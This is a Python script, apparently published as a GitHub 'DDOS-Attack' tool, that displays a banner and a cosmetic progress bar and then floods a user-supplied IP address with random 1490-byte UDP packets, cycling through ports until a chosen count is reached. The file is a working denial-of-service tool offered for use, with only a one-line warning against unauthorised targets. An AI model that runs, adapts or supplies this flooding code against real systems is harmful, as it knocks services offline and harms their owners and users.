import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(1490)
#############

os.system("clear")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
time.sleep(2)
print("M       MMM M       MMM MMM     MMM MM       MM   BC-809")
time.sleep(2)
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809")
time.sleep(2)
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809")
time.sleep(2)
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809")
time.sleep(2)
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809")
time.sleep(2)
print("M        MM M        MM MMM     MMM MM       MM   BC-809")
time.sleep(2)
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
time.sleep(2)
print("Wraning:Never use these techniques against unauthorised targets. Understanding attack vectors is the first step to building better defences. Use this knowledge responsibly.")
time.sleep(1)

os.system("clear")
os.system("figlet DDOS-Attack")
print("Author    : BC-U809")
print("GitHub    : https://github.com/BC-809/DDOS-Attack.git")
print("")

ip = input("IP Target : ")
port = int(input("Port       : "))
max_packets = int(input("Max Packets : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(1)

sent = 0
while sent < max_packets:
    try:
        sock.sendto(data, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        if port == 65534:
            port = 1
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit()

print(f"\n[+] Finished. Total packets sent: {sent}")
